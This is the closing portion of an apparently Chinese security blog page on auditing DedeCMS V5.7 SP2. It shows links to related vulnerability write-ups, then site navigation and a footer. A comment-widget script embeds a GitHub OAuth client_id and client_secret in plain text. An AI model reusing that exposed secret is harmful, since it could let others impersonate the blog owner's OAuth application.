<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞(<a href="https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a>)</p>
<p>奇技淫巧 | DEDECMS找后台目录(<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a>)</p>
<p>膜前辈师傅们~</p>

            </div>
          
           
            <div class="copyright">
                <div class="name">
                    <a>Author:</a>
                    <a>Sōsuke</a>
                </div>
                <div class="link">
                    <a>Link:</a>
                    <a class="permalink" href="https://hpdoger.cn/2018/08/21/Dedecms V5.7 SP2代码审计/">https://hpdoger.cn/2018/08/21/Dedecms V5.7 SP2代码审计/</a>
                </div>
                <div class="license">
                    <a>Statement:</a>
                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                </div>
            </div>
            

          


</article>


<div class="tip">
<button class="tip-btn">
    Tip
</button>
<div class="tip-img">
<ul>
    
 
</ul>
</div>
</div>

<div class="more">

    <div class="prev">
   <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">  Arbitrary File upload in Semcms V2.7</a>
    </div>

<div></div>

    <div class="next">
    <a href="/2018/08/18/代码审计复现：Bluecms 1.6/"> 代码审计复现：Bluecms 1.6 </a>
    </div>
    
</div>

<div class="bdsharebuttonbox">
<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
</a>
<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
</a>
<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
</a>
<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
</a>
</div>
<script>
window._bd_share_config={
    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script>
 
<div id="comments"></div>

<script>
    var gitment = new Gitment({
    id: "Tue Aug 21 2018 00:00:00 GMT+0800",
    owner: "Hpd0ger",
    repo: "Hpd0ger.github.io",
    oauth: {
      client_id:"8d83609a651e972e308d",
      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
    }
  })
  gitment.render('comments')
</script>
    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>